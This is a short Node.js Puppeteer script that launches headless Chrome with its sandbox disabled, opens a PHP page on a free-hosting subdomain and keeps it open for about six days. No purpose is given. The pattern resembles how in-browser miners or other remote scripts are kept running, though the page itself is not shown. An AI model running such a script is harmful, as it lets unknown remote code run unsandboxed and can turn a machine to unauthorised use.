const puppeteer = require('puppeteer');

 
(async () => {
  const browser = await puppeteer.launch({args: ['--no-sandbox', '--disable-setuid-sandbox']});
  const page = await browser.newPage();
  await page.goto('https://e-get.000webhostapp.com/z.php');
  await page.waitFor(521160000);

  await browser.close();

})();


